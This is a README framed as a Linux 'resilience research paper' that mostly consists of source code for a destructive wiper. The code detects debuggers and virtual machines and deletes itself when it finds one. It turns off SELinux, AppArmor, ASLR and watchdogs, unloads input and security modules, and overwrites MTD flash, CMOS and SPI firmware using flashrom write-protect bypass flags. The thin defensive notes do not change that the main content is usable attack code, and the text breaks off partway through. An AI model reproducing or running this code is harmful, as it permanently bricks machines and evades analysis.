# 🔬 linux-resilience-research


<div align="center">

```
╔══════════════════════════════════════════════════════════════════╗
║                    SECURITY RESEARCH PAPER                        ║
║              Linux System Resilience Analysis                     ║
╚══════════════════════════════════════════════════════════════════╝
```

[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-Security%20Research-red)]()

**Author:** Vladislav Khudash (17)  
**Date:** 05.04.2026  
**Project:** LINUX-RESILIENCE-RESEARCH

</div>

---

## ⚠️ CRITICAL RESEARCH NOTICE

<div align="center">

| | |
|---|---|
| **🔬 Purpose** | Security research on Linux system resilience and recovery mechanisms |
| **🧪 Environment** | **ISOLATED VIRTUAL MACHINES ONLY** — Never run on production systems |
| **⚖️ Legal** | This research demonstrates attack vectors for defensive purposes only |
| **💀 Warning** | This code will **PERMANENTLY DESTROY** the target system |
| **📚 Educational** | Understanding these techniques is essential for building robust defenses |

</div>

---

## 📖 Table of Contents

- [English](#english)
  - [1. Research Abstract](#1-research-abstract)
  - [2. Attack Surface Analysis](#2-attack-surface-analysis)
  - [3. Complete Source Code Analysis](#3-complete-source-code-analysis)
  - [4. Defense Recommendations](#4-defense-recommendations)

- [Русский](#русский)
  - [1. Аннотация исследования](#1-аннотация-исследования)
  - [2. Анализ поверхности атаки](#2-анализ-поверхности-атаки)
  - [3. Полный анализ исходного кода](#3-полный-анализ-исходного-кода)
  - [4. Рекомендации по защите](#4-рекомендации-по-защите)

---

# English

## 1. Research Abstract

This research examines **Linux system resilience** against comprehensive destructive attacks. The study implements and documents multiple attack vectors to understand how modern Linux systems can be compromised and what defensive measures are effective.

### Research Objectives

| Objective | Description |
|-----------|-------------|
| **Boot Chain Analysis** | Study GRUB, initrd, and kernel parameter manipulation |
| **Firmware Security** | Examine UEFI/BIOS write protection bypasses |
| **Hardware Persistence** | Analyze SPI flash, CMOS, and MTD device vulnerabilities |
| **Anti-Forensics** | Document secure deletion and system state destruction |
| **Detection Evasion** | Study anti-debug, anti-VM, and anti-sandbox techniques |

### Attack Surface Coverage

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          ATTACK SURFACE LAYERS                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                     FIRMWARE LAYER                                   │    │
│  │  • SPI Flash (BIOS/UEFI)     • CMOS/NVRAM       • EFI Variables      │    │
│  │  • MTD Devices               • Flashrom exploitation                  │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                    │                                        │
│                                    ▼                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                     BOOTLOADER LAYER                                 │    │
│  │  • GRUB2 Configuration       • Kernel Command Line    • initrd        │    │
│  │  • MBR/VBR Overwrite         • /sbin/init Replacement                 │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                    │                                        │
│                                    ▼                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                     KERNEL LAYER                                     │    │
│  │  • Sysctl Parameters         • Kernel Modules         • /proc & /sys  │    │
│  │  • Device Drivers            • Memory Management      • I/O Ports     │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                    │                                        │
│                                    ▼                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                     USERSPACE LAYER                                  │    │
│  │  • Filesystem Destruction    • Process Termination    • Input Block  │    │
│  │  • Library Corruption        • Service Disruption      • RAM Exhaust  │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Attack Surface Analysis

### 2.1 Configuration Flags

```python
#SECTION CONFIG

# [ PRIVILEGE STRATEGY ]
# True : Force root access by retrying indefinitely until success
FORCE_ROOT_ACCESS:bool=False

# [ BOOT STRATEGY ]
# True : Patch GRUB, set custom init, and reboot to gain PID 1
ENABLE_GRUB_TAKEOVER:bool=False 

# [ ANTI-DEBUG ]
# True : Detect and self-destruct if ptrace, gdb, or any tracer is attached
ENABLE_ANTIDEBUG:bool=False

# [ SANDBOX CONTROL ]
# True : Self-destruct if running in a Virtual Machine or Sandbox environment
BLOCK_SANDBOX:bool=False

# [ STEALTH STRATEGY ]
# True : Overwrite and delete this file immediately upon any detection
STRICT_SELF_DESTRUCT:bool=False
```

**Research Significance:**

| Flag | Attack Vector | Defensive Implication |
|------|---------------|----------------------|
| `FORCE_ROOT_ACCESS` | Persistent privilege escalation | Monitor sudo/pkexec usage patterns |
| `ENABLE_GRUB_TAKEOVER` | Boot chain compromise | Enable Secure Boot, lock GRUB config |
| `ENABLE_ANTIDEBUG` | Anti-analysis protection | Use hardware breakpoints, kernel debugging |
| `BLOCK_SANDBOX` | VM/sandbox detection | Improve sandbox fidelity, hide hypervisor artifacts |
| `STRICT_SELF_DESTRUCT` | Evidence destruction | Implement write-once logging, remote syslog |

### 2.2 Anti-Debug Techniques

```python
def __antidebug():
    # Timing-based debugger detection
    _ = perf_counter()
    # ... operations ...
    if (perf_counter() - _) > 0.3:
        __die()
    
    # Environment variable detection
    if any(_getenv(e) for e in (
        'LD_PRELOAD', 'LD_AUDIT', 'PYTHONINSPECT',
        'PYTHONDEVMODE', 'PYTHONTRACEMALLOC', 'PYTHONFAULTHANDLER'
    )):
        __die()
    
    # Process state inspection via /proc
    with open(b'/proc/self/status', 'rb') as f:
        # Check State (T=tracing, Z=zombie)
        # Check TracerPid != 0
        # Check CoreDumping != 0
        # Check Threads != 1
```

**Detection Methods:**

| Method | Detection Target | Evasion Difficulty |
|--------|-----------------|-------------------|
| Timing analysis | `ptrace`, `gdb`, `strace` | Medium |
| Environment scan | `LD_PRELOAD`, debugger vars | Low |
| `/proc/self/status` | TracerPid, State, Threads | High |
| Parent process name | `gdb`, `strace`, `ltrace`, `valgrind` | Medium |
| Open file descriptors | Count > 5 indicates debugging | Low |

### 2.3 Virtual Machine Detection

```python
def __block_sandbox():
    # Hardware presence checks
    if not all(_isexst(p) for p in (
        b'/dev/cpu/0', b'/dev/port', b'/dev/mem',
        b'/dev/urandom', b'/dev/null', b'/dev/full'
    )):
        __die()
    
    # Disk size check (< 100GB suggests VM)
    st = os.statvfs(b'/')
    sz = (st.f_blocks * st.f_frsize) >> 30
    if sz < 100:
        __die()
    
    # PCI device vendor ID detection
    vmid = s_set((
        mem(b'\xF4\x1A'),  # QEMU
        mem(b'\xAD\x15'),  # VirtualBox
        mem(b'\xEE\x80'),  # VMware
    ))
    
    # DMI/SMBIOS string analysis
    with open(dmi + b'sys_vendor', 'rb') as f:
        if any(s in idx for s in (b'qemu', b'vbox', b'vmware')):
            __die()
```

**VM Detection Vectors:**

| Vector | Legitimate System | Virtual Machine |
|--------|------------------|-----------------|
| PCI Vendor ID | Hardware-specific | `0xF41A` (QEMU), `0xAD15` (VBox) |
| DMI sys_vendor | Dell, Lenovo, HP | QEMU, VirtualBox, VMware |
| CPU count | ≥4 typical | Often 1-2 by default |
| Disk size | ≥256GB typical | Often <100GB |
| `/dev/cpu/0` | Present | Often absent |
| Thermal zones | ≥5 typical | Often <5 |

### 2.4 Self-Destruction Mechanism

```python
def __die(_=True):
    if not STRICT_SELF_DESTRUCT:
        _exit(0)
    
    # Secure file deletion
    sz = os.path.getsize(__file__)
    tmp = f'{__file__}.{_urandom(8).hex()}'
    
    # Rename to random name
    os.rename(__file__, tmp)
    
    # Overwrite with random data
    with open(tmp, 'rb+') as i:
        i.write(mem(_urandom(sz)))
        os.fsync(i.fileno())
    
    # Delete
    os.remove(tmp)
```

---

## 3. Complete Source Code Analysis

<details>
<summary><b>📁 Section 1: Imports and Initialization</b></summary>

```python
#=================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 05.04.2026
#     PROJECT  : LINUX-DESTRUCTION
#     PLATFORM : LINUX
#=================================#

#SECTION CONFIG

# [Configuration flags documented above]

#END CONFIG

# Type validation
if not isinstance(FORCE_ROOT_ACCESS, bool):
    raise SystemExit('(FORCE_ROOT_ACCESS) must be (bool)')
# ... validation for all flags

# Obfuscated initialization
__init=type('main', (Exception,), {
        '__slots__' : ('_',),
        '__init__'  : lambda s, f: (
            s.__setattr__('_', f), 
            Exception.__init__(s)
        )[1]
    }
)
main=0
def main():raise(SystemExit(0))
__=1;globals()['__']=NotImplemented
___=2;globals()['___']=ENABLE_ANTIDEBUG
____=3;globals()['____']=BLOCK_SANDBOX
```

**Analysis:**
- Dynamic class creation for obfuscation
- Global variable aliasing to detect tampering
- Lambda-based initialization chain

</details>

<details>
<summary><b>📁 Section 2: Anti-Analysis Framework</b></summary>

```python
#SECTION ANTI-ANALYSIS

import sys
sys.dont_write_bytecode=True
import os

if not sys.platform.startswith('linux'):
    try:
        sys.stderr.write(f'DO NOT SUPPORT OS ({sys.platform})')
    finally:
        os._exit(1)

getattr(sys, 'setswitchinterval', lambda _: None)(0.03)

from ctypes import memset, CDLL
from time   import perf_counter 

MOUNTS = b'/proc/self/mounts'

mem      = memoryview
array    = bytearray
s_set    = frozenset

_si      = sys.intern
_argv    = sys.argv
_sysconf = os.sysconf
_getenv  = os.getenv
_urandom = os.urandom
_isexst  = os.path.exists
_scandir = os.scandir
_exit    = os._exit

try:
    libc = CDLL( None )
except OSError:
    libc = None

try:
    _cpus = _sysconf('SC_NPROCESSORS_ONLN')
except (ValueError, OSError):
    _cpus = 3

__file__ = os.path.realpath(_argv[ 0 ])

try:
    with open(__file__, 'rb', buffering=0) as i:
        i.seek(0)
        IS_ELF = i.read(4) == b'\x7fELF'
except OSError:
        IS_ELF = False

FLAG_ROOT = _si('-r')
FLAG_MEM  = _si('-m')
FLAG_INIT = _si('-i')
```

**Key Optimizations:**
- `sys.intern()` for fast string comparisons
- `memoryview` for zero-copy operations
- Direct libc access via `ctypes.CDLL`
- ELF detection for binary vs script execution

</details>

<details>
<summary><b>📁 Section 3: Self-Destruction (__die)</b></summary>

```python
def __die(_=True):
    _ and not STRICT_SELF_DESTRUCT and _exit(0)
    
    try: 
        sz  = os.path.getsize(__file__)
        tmp = f'{__file__}.{_urandom(8).hex()}'

        try:
            os.rename(__file__, tmp)
        except OSError:
            tmp = __file__

        with open(tmp, 'rb+', buffering=0) as i:
            i.seek(0)
            i.write(mem(_urandom(sz)))
            os.fsync(i.fileno())

        os.remove(tmp)

    except OSError: 
        try:
            os.remove(__file__)
        except OSError:
            pass

    finally:
        _ and _exit(0)
```

**Secure Deletion Properties:**
1. Rename to random name (hides original filename)
2. Overwrite entire file with random data
3. `fsync()` ensures data is written to disk
4. Delete after overwrite
5. Fallback to direct removal if overwrite fails

</details>

<details>
<summary><b>📁 Section 4: Anti-Debug Implementation</b></summary>

```python
def __antidebug():
    _ = perf_counter()

    if (__name__ != '__main__') and (FLAG_ROOT not in _argv):
        __die()

    if sys.gettrace() is not None:
        __die()

    if any(_getenv(e) for e in (
        'LD_PRELOAD',           'LD_AUDIT',             'PYTHONINSPECT',
        'PYTHONDEVMODE',        'PYTHONTRACEMALLOC',    'PYTHONFAULTHANDLER',
        'PYTHONDEBUG',          'PYTHONBREAKPOINT',     'PYTHONPATH',
        'PYDEVD_USE_CYTHON',    'PYDEVD_LOAD_ASYNC',    'PYDEVD_DISABLE_FILE'
    )):
        __die()

    if (perf_counter() - _) > 0.3:
        __die()

    _ = perf_counter()

    try:
        st = mem(b'State:')
        tp = mem(b'TracerPid:')
        cd = mem(b'CoreDumping:')
        th = mem(b'Threads:')   

        with open(b'/proc/self/status', 'rb', buffering=0) as f:
            for l in f:
                n = l.split(maxsplit=2)
                if len(n) < 2:
                    continue
                
                _sw = l.startswith
                v   = n[ 1 ]

                if _sw(st):
                    if v in {b'T', b't', b'Z', b'z'}:
                        __die()
                    continue
                    
                elif _sw((tp, cd)):
                    if v != b'0':
                        __die()
                    continue
                    
                elif _sw(th):
                    if v != b'1':
                        __die()
                    break
                
            else:
                __die()

    except OSError: 
        __die()

    try:
        with open(b'/proc/%d/comm' % os.getppid(), 'rb', buffering=0) as f:
            comm = mem(f.read().lower())

            if any(n in comm for n in (
                mem(b'gdb'),     mem(b'strace'),    mem(b'ltrace'),
                mem(b'ida'),     mem(b'r2'),        mem(b'ghidra'),
                mem(b'vbox'),    mem(b'qemu'),      mem(b'kvm'),
                    mem(b'valgrind'),     mem(b'frida')
            )):
                __die()
            
    except OSError:
        __die()

    try:
        with _scandir(b'/proc/self/fd') as d:
            sfd = sum(1 for _ in d)
        
        if sfd > 5:
            __die()

    except OSError: 
        __die()

    if (perf_counter() - _) > 0.5:
        __die()
    
    globals()['__']=...
```

**Detection Layers:**

| Layer | Detection Method | Response |
|-------|-----------------|----------|
| 1 | Python trace function | Self-destruct |
| 2 | Debugger environment variables | Self-destruct |
| 3 | Timing analysis (>300ms overhead) | Self-destruct |
| 4 | Process state (T=tracing) | Self-destruct |
| 5 | TracerPid != 0 | Self-destruct |
| 6 | Parent process name (gdb, strace) | Self-destruct |
| 7 | Open fd count > 5 | Self-destruct |

</details>

<details>
<summary><b>📁 Section 5: Sandbox/VM Detection</b></summary>

```python
def __block_sandbox():
    if not all(_isexst(p) for p in (
        b'/dev/cpu/0',           b'/dev/port',            b'/dev/mem',            
        b'/dev/urandom',         b'/dev/null',            b'/dev/full',           
        b'/sys/class/dmi/id',    b'/sys/devices',         b'/sys/class/block',    
        b'/sys/class/net',       b'/sys/class/input',     b'/proc/ioports',     
        b'/proc/self',           b'/proc/self/status',    MOUNTS                  
    )):
        __die()

    try:
        st = os.statvfs(b'/')
        sz = (st.f_blocks * st.f_frsize) >> 30
        if sz < 100:
            __die()
    except OSError:
        __die()

    vmid = s_set((
        mem(b'\xF4\x1A'),    mem(b'\xAD\x15'), 
        mem(b'\xEE\x80'),    mem(b'\x34\x12'), 
        mem(b'\x14\x14'),    mem(b'\x6B\x1B')
    ))

    try:
        d = _scandir(b'/sys/bus/pci/devices')
    except OSError:
        __die()

    for n in d:
        try:
            with open(n.path + b'/config', 'rb', buffering=0) as f:
                cfg    = mem(f.read(256))
                cfg_sz = len(cfg)

                if cfg_sz < 64:
                    continue

                if cfg[ 0 : 2 ] in vmid:
                    __die()

                ptr = cfg[ 0x34 ]

                for _ in range(16): 
                    if (ptr == 0x00) or (ptr > (cfg_sz - 2)):
                        break
                        
                    if cfg[ ptr ] == 0x09: 
                        __die()

                    ptr = cfg[ ptr + 1 ]  

        except OSError:
            continue

    d.close()
    
    try:
        dmi = b'/sys/class/dmi/id/'

        for (node, sign) in (
            (b'sys_vendor', (
                mem(b'qemu'),      mem(b'vbox'),       mem(b'vmware'), 
                mem(b'kvm'),       mem(b'bochs'),      mem(b'parallels'),
                mem(b'xen'),       mem(b'innotek'),    mem(b'amazon'),    
                mem(b'google'),    mem(b'alibaba'),    mem(b'digitalocean'),
                            mem(b'microsoft corporation') 
            )),
            
            (b'bios_vendor', (
                mem(b'seabios'),    mem(b'ovmf'),     mem(b'bochs'), 
                mem(b'xen'),        mem(b'bhyve'),    mem(b'hyper-v')
            )),

            (b'board_vendor', (
                mem(b'qemu'),    mem(b'vbox'),    mem(b'vmware'),
                        mem(b'virtualbox'), mem(b'oracle')
            )),

            (b'product_name', (
                mem(b'qemu'),      mem(b'kvm'),            mem(b'virtual'),
                mem(b'vmware'),    mem(b'q35'),            mem(b'ich9'),      
                mem(b'2009'),      mem(b'droplet'),        mem(b'hvm'),       
                        mem(b'instance'),       mem(b'hyper-v')
            ))
        ):
            with open(dmi + node, 'rb', buffering=0) as f:
                idx = mem(f.read().lower())

                if any(s in idx for s in sign):
                    __die()

    except OSError:
        __die()

    if _cpus < 4:
        __die()

    try:
        sep = b' '[ 0 ]
        lb  = mem(b'flags')
        hv  = mem(b'hypervisor')
        hvl = len(hv)

        buf = array(hvl)
        ptr = mem(buf)
        pos = 0

        with open(b'/proc/cpuinfo', 'rb', buffering=0) as f:
            for l in f:
                l = mem(l)

                if l[ 0 : 5 ] != lb:
                    continue
                
                for b in l:
                    if b == sep:
                        if ptr[ 0 : pos ] == hv:
                            __die()
                        pos = 0
                        continue
                    elif pos < hvl:
                        ptr[ pos ] = b 
                        pos += 1
                break
            else:
                __die()

    except OSError:
        __die()

    try:
        ramsz = (_sysconf('SC_PAGE_SIZE') * _sysconf('SC_PHYS_PAGES')) >> 30
        if ramsz < 4: 
            __die()
    except (ValueError, OSError):
        __die()

    try:
        dv = mem(b'/dev/')
        fs = mem(b'/')

        with open(MOUNTS, 'rb', buffering=0) as f:
            for l in f:
                if not l.startswith(dv):
                    continue
                if l.split(maxsplit=2)[ 1 ] != fs:
                    continue
                break
            else:
                __die()

    except (IndexError, OSError):
        __die()

    try:
        qt = b'"'[ 0 ]
        lb = mem(b'ID=')

        osrel = b'/etc/os-release'
        if not _isexst(osrel):
            osrel = b'/usr/lib/os-release'

        with open(osrel, 'rb', buffering=0) as f:
            for l in f:
                l = mem(l)

                if l[ 0 : 3 ] != lb:
                    continue

                desc = l[ 3 : -1 ]

                if desc[ 0 ] == qt:
                    desc = desc[ 1 :    ]
                
                if desc[ -1 ] == qt:
                    desc = desc[   : -1 ]
                
                if desc not in {
                    mem(b'debian'),        mem(b'ubuntu'),       mem(b'linuxmint'), 
                    mem(b'elementary'),    mem(b'pop'),          mem(b'zorin'),
                    mem(b'fedora'),        mem(b'rhel'),         mem(b'centos'), 
                    mem(b'alma'),          mem(b'rocky'),        mem(b'ol'), 
                    mem(b'scientific'),    mem(b'amzn'),         mem(b'clearlinux'),
                    mem(b'opensuse'),      mem(b'suse'),         mem(b'sles'),
                    mem(b'arch'),          mem(b'manjaro'),      mem(b'mx'),
                    mem(b'gentoo'),        mem(b'slackware'),    mem(b'void')
                }:
                    __die()
                
                break
                
            else:
                __die()

    except (IndexError, OSError):
        __die()
    
    try:
        with _scandir(b'/sys/class/thermal') as d:
            tm = sum(1 for _ in d)
            
        if tm < 5:
            __die()

    except OSError: 
        __die()

    try:
        if _sysconf('SC_OPEN_MAX')  < 1024:
            __die()
        if _sysconf('SC_CHILD_MAX') < 512:
            __die()

    except (ValueError, OSError):
        __die()
    
    globals()['__']=...
```

**VM Detection Matrix:**

| Check | Physical System | Virtual Machine |
|-------|-----------------|-----------------|
| PCI Vendor ID | Hardware vendor | `0xF41A`, `0xAD15`, `0xEE80` |
| DMI sys_vendor | Dell/Lenovo/HP | QEMU/VBox/VMware |
| DMI bios_vendor | AMI/Phoenix | SeaBIOS/OVMF |
| CPU flags | No "hypervisor" | "hypervisor" present |
| CPU cores | ≥4 typical | 1-2 typical |
| RAM size | ≥8GB typical | <4GB common |
| Disk size | ≥256GB | <100GB common |
| Thermal zones | ≥5 | <5 |
| OS Release | Mainstream distro | Often non-standard |

</details>

<details>
<summary><b>📁 Section 6: System Call & Kernel Hardening Disable</b></summary>

```python
def SYSCTL():
    _pf = mem(b'performance\n')
    _op = open 

    mount(None, b'/proc', flag=(b're', b'rw'))
    mount(None, b'/sys',  flag=(b're', b'rw'))

    for (p, v) in (
        (b'/proc/sys/kernel/printk',                        b'0 0 0 0'  ),
        (b'/proc/sys/kernel/printk_devkmsg',                b'off'      ),
        (b'/proc/sys/kernel/dmesg_restrict',                b'1'        ),
        (b'/proc/sys/kernel/printk_ratelimit',              b'0'        ),
        (b'/proc/sys/kernel/core_pattern',                  b'/dev/null'),
        (b'/proc/sys/kernel/panic_print',                   b'0'        ),

        (b'/sys/module/apparmor/parameters/enabled',        b'N'        ),
        (b'/sys/kernel/security/apparmor/profiles',         b'off'      ), 
        (b'/sys/fs/selinux/enforce',                        b'0'        ),
        (b'/sys/fs/selinux/disable',                        b'1'        ),
        (b'/sys/module/selinux/parameters/enabled',         b'0'        ),
        (b'/sys/module/yama/parameters/enabled',            b'0'        ),
        (b'/sys/module/loadpin/parameters/enabled',         b'0'        ),
        (b'/proc/sys/kernel/yama/ptrace_scope',             b'3'        ), 
        (b'/proc/sys/kernel/kptr_restrict',                 b'2'        ),
        (b'/proc/sys/kernel/perf_event_paranoid',           b'3'        ),
        (b'/proc/sys/user/max_user_namespaces',             b'0'        ),

        (b'/proc/sys/kernel/ctrl-alt-del',                  b'0'        ),
        (b'/proc/sys/kernel/cad_pid',                       PID.encode()),
        (b'/proc/sys/kernel/sysrq',                         b'0'        ), 

        (b'/proc/sys/kernel/nmi_watchdog',                  b'0'        ),
        (b'/proc/sys/kernel/softlockup_panic',              b'0'        ),
        (b'/proc/sys/kernel/hung_task_timeout_secs',        b'0'        ),
        (b'/proc/sys/kernel/panic',                         b'0'        ),
        (b'/proc/sys/kernel/panic_on_oops',                 b'0'        ),
        (b'/proc/sys/vm/panic_on_oom',                      b'0'        ),

        (b'/proc/sys/kernel/kexec_load_disabled',           b'0'        ),
        (b'/proc/sys/kernel/modules_disabled',              b'0'        ),
        (b'/proc/sys/kernel/randomize_va_space',            b'0'        ),
        (b'/proc/sys/kernel/sched_autogroup_enabled',       b'0'        ),
        (b'/proc/sys/vm/laptop_mode',                       b'0'        ),  
        (b'/proc/sys/vm/swappiness',                        b'0'        ),
        (b'/sys/kernel/mm/transparent_hugepage/enabled',    b'never'    ),
        (b'/proc/sys/vm/overcommit_memory',                 b'1'        ), 
        (b'/proc/sys/vm/vfs_cache_pressure',                b'1000'     ), 
        (b'/proc/sys/vm/oom_kill_allocating_task',          b'1'        )
    ):
        try:
            with _op(p, 'wb', buffering=0) as f:
                f.write(v + b'\n')
        except OSError:
            continue
    
    for n in range(_cpus):
        try:
            with _op(
                b'/sys/devices/system/cpu/cpu%d/cpufreq/scaling_governor' % n, 
                'wb', buffering=0
            ) as f:
                f.write(_pf)
        except OSError: 
            continue
```

**Kernel Hardening Disabled:**

| Parameter | Default | Set To | Impact |
|-----------|---------|--------|--------|
| `dmesg_restrict` | 0 | 1 | Hide kernel messages |
| `kptr_restrict` | 0 | 2 | Hide kernel pointers |
| `perf_event_paranoid` | 2 | 3 | Disable performance monitoring |
| `randomize_va_space` | 2 | 0 | Disable ASLR |
| `ptrace_scope` | 1 | 3 | Block all ptrace |
| `apparmor/selinux` | enabled | disabled | Disable MAC |
| `panic_on_oops` | 0 | 0 | Prevent kernel panic on oops |
| `swappiness` | 60 | 0 | Minimize swapping |
| `watchdog` | enabled | disabled | Disable hardware watchdog |

</details>

<details>
<summary><b>📁 Section 7: Module Manipulation</b></summary>

```python
def MODULE():
    MOD = which('modprobe')

    if not _isfile(MOD, _fxo):
        return

    offmod = (
        'apparmor',      'selinux',         'tomoyo', 
        'smack',         'yama',            'loadpin', 

        'usbhid',        'hid_generic',     'hid',    
        'evdev',         'atkbd',           'psmouse',        
                         'i8042',

        'button',        'acpi_pad',        'thermal',

        'ipmi_si',       'ipmi_devintf',    'ipmi_msghandler', 
        'netconsole',    'pstore',          'efi_pstore',

        'softdog',       'iTCO_wdt',        'iTCO_vendor_support', 
        'sp5100_tco',    'watchdog',        'pcwd'
    )
    
    cmd((MOD, '-r', '-a', '-f', *offmod))

    for t in (
        (MOD, 'mem',          'strict_devmem=0'),      
        (MOD, 'efivarfs'),                    
        (MOD, 'spi-intel',    'writeable=1'),    
        (MOD, 'spi-dev',      'writeable=1'),      
        (MOD, 'mtd',          'ro=0'),                
        (MOD, 'spi-nor'), 
        (MOD, 'm25p80'),    
        (MOD, 'lpc_ich'), 
        (MOD, 'nvram')       
    ):
        cmd(t)
```

**Module Attack Surface:**

| Module | Purpose | Attack Vector |
|--------|---------|---------------|
| `apparmor`/`selinux` | MAC security | Remove to disable access controls |
| `usbhid`/`evdev` | Input devices | Remove to block user input |
| `watchdog` | System recovery | Remove to prevent automatic reboot |
| `mem` | `/dev/mem` access | Load with `strict_devmem=0` for raw memory |
| `efivarfs` | EFI variables | Load for firmware manipulation |
| `spi-nor`/`m25p80` | SPI flash | Load for BIOS/UEFI write access |
| `nvram` | CMOS access | Load for RTC/CMOS manipulation |

</details>

<details>
<summary><b>📁 Section 8: MTD (Memory Technology Device) Destruction</b></summary>

```python
def MTD():
    PROC_MTD  = b'/proc/mtd'
    MEMUNLOCK = 0x40084d06
    MEMERASE  = 0x40084d02

    lb  = mem(b'mtd')
    dt  = mem(b':')
    dev = []

    if not _isfile(PROC_MTD, _fro):
        return

    with open(PROC_MTD, 'rb', buffering=0) as f:
        for l in f:
            try:
                if not l.startswith(lb):
                    continue

                n = l.split(maxsplit=3)
                dev.append((
                    b'/dev/' + n[ 0 ].rstrip(dt), 
                    int(n[ 1 ], 16),
                    int(n[ 2 ], 16)
                ))
            except (IndexError, ValueError):
                continue
    
    if not dev:
        return

    for (node, sz, esz) in dev:
        if esz < 1:
            continue

        try:
            set_rw(node)

            with open(node, 'rb+', buffering=0) as m:
                fd = m.fileno()

                try:
                    ioctl(
                        fd,
                        MEMUNLOCK,
                        (0 ).to_bytes(4, 'little') +
                        (sz).to_bytes(4, 'little')
                    )
                except OSError:
                    pass

                for off in range(0, sz, esz):
                    bln = min(esz, sz - off)

                    try:
                        ioctl(
                            fd,
                            MEMERASE,
                            off.to_bytes(4, 'little') +
                            bln.to_bytes(4, 'little')
                        )
                    except OSError:
                        pass

                i = sz
                while i:
                    bwt = min(_4mb, i)
                    m.write(URANDOM[ 0 : bwt ]) 
                    i -= bwt

                _fsync(fd)

        except OSError:
            continue
```

**MTD Attack Chain:**
1. Parse `/proc/mtd` for flash devices
2. `MEMUNLOCK` ioctl to unlock device
3. `MEMERASE` ioctl to erase each block
4. Overwrite with random data
5. `fsync()` to commit

</details>

<details>
<summary><b>📁 Section 9: CMOS/NVRAM Destruction</b></summary>

```python
def CMOS():
    NVRAM = b'/dev/nvram'
    RTC   = b'/dev/rtc0'
    PORT  = b'/dev/port'

    try:
        with open(NVRAM, 'rb+', buffering=0) as nv:
            sz = nv.seek(0, os.SEEK_END) or 128
            nv.seek(0)
            nv.write(URANDOM[ 0 : sz ])
            _fsync(nv.fileno())
    
    except OSError:
        pass 

    try:
        with open(RTC, 'rb', buffering=0) as rc:
            ioctl(rc.fileno(), 0x4024700a, mem(b'c\x00\x00\x00c\x00\x00\x00c\x00\x00\x00c\x00\x00\x00c\x00\x00\x00\x96\x00\x00\x00\t\x00\x00\x00\x90\x01\x00\x00\xff\xff\xff\xff'))
    except OSError:
        pass

    try:
        with open(PORT, 'rb+', buffering=0) as pt:
            for i in range(128):
                pt.seek(0x70)
                pt.write((i | 0x80).to_bytes())
                
                pt.seek(0x71)
                pt.write(URANDOM[ i : i + 1 ])
            
            pt.seek(0x70)
            pt.write(b'\x00')
            
            _fsync(pt.fileno())
    except OSError:
        pass
```

**CMOS Attack Vectors:**

| Device | Purpose | Attack Method |
|--------|---------|---------------|
| `/dev/nvram` | Non-volatile RAM | Overwrite with random data |
| `/dev/rtc0` | Real-time clock | Corrupt RTC registers via ioctl |
| `/dev/port` | I/O port access | Direct CMOS write via ports 0x70/0x71 |

</details>

<details>
<summary><b>📁 Section 10: Flashrom SPI Flash Destruction</b></summary>

```python
def FLASHROM():
    FLASH = which('flashrom')

    if not _isfile(FLASH, _fxo):
        if not install_packet('flashrom'):
            return
        
        FLASH = which('flashrom')

        if not _isfile(FLASH, _fxo):
            return

    flags = {
        'std' : 'internal',
        'mms' : 'internal:boardmismatch=force',
        'brk' : 'internal:laptop=force_I_want_a_brick,boardmismatch=force,ignorspifplock=yes',
        'hws' : 'internal:ich_spi_mode=hwseq,laptop=force_I_want_a_brick,boardmismatch=force',
        'sws' : 'internal:ich_spi_mode=swseq,laptop=force_I_want_a_brick,boardmismatch=force',
        'spi' : 'internal:bus=spi,laptop=force_I_want_a_brick',
        'lpc' : 'internal:bus=lpc,laptop=force_I_want_a_brick',
        'fwh' : 'internal:bus=fwh,laptop=force_I_want_a_brick',
        'ime' : 'internal:ich_spi_force=yes,laptop=force_I_want_a_brick'
    }

    # Write protection bypass attempts
    for c in (
        (FLASH, '-p', flags[ 'std' ], '--wp-disable'                   ),
        (FLASH, '-p', flags[ 'brk' ], '--wp-disable', '--force'        ),
        (FLASH, '-p', flags[ 'mms' ], '--wp-disable', '--force'        ),
        (FLASH, '-p', flags[ 'brk' ], '--wp-range', '0', '0', '--force'),
        (FLASH, '-p', flags[ 'hws' ], '--wp-range', '0', '0', '--force'),
        (FLASH, '-p', flags[ 'sws' ], '--wp-range', '0', '0', '--force'),
        (FLASH, '-p', flags[ 'std' ], '--unlock'                       ),
        (FLASH, '-p', flags[ 'brk' ], '--unlock'                       ),
        (FLASH, '-p', flags[ 'mms' ], '--wp-list'                      )
    ):
        cmd(c)

    tmp = f'/tmp/.{_urandom(8).hex()}'

    try:
        with open(tmp, 'wb', buffering=0) as f:
            f.write(URANDOM) 
            _fsync(f.fileno())
    except OSError: 
        pass
    else:
        # Erase and write attempts
        for c in (
            (FLASH, '-p', flags[ 'brk' ], '-w', tmp, '--force', '--noverify'                 ),
            (FLASH, '-p', flags[ 'hws' ], '-w', tmp, '--force', '--noverify', '--ignore-lock'),
            (FLASH, '-p', flags[ 'sws' ], '-w', tmp, '--force', '--noverify', '--ignore-lock'),         
            (FLASH, '-p', flags[ 'brk' ], '-i', 'bios', '-w', tmp, '--force', '--noverify'   ),    
            (FLASH, '-p', flags[ 'brk' ], '-E', '--force', '--noverify', '--ignore-lock'     )
        ):
            if cmd(c) == 0: 
                break

    # Erase-only attempts
    for c in (
        (FLASH, '-p', flags[ 'std' ], '-E', '--force', '--noverify'                                   ),
        (FLASH, '-p', flags[ 'brk' ], '-E', '--force', '--noverify', '--ignore-lock'                  ),
        # ... multiple flag combinations
    ):
        if cmd(c) == 0: 
            break

    # External programmers
    for p in (
